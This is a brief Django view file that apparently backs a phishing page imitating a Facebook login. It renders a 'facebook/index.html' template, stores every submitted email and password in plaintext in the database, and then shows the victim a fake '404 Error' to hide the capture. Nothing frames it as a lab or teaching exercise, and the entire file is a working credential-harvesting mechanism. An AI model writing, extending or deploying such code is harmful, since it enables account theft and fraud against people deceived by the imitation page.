from django.shortcuts import render, HttpResponse
from .models import User
# Create your views here.
def index(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get("password")
        User.objects.create(email=email, password=password)
        return HttpResponse("404 Error")
    else:
        return render(request, "facebook/index.html")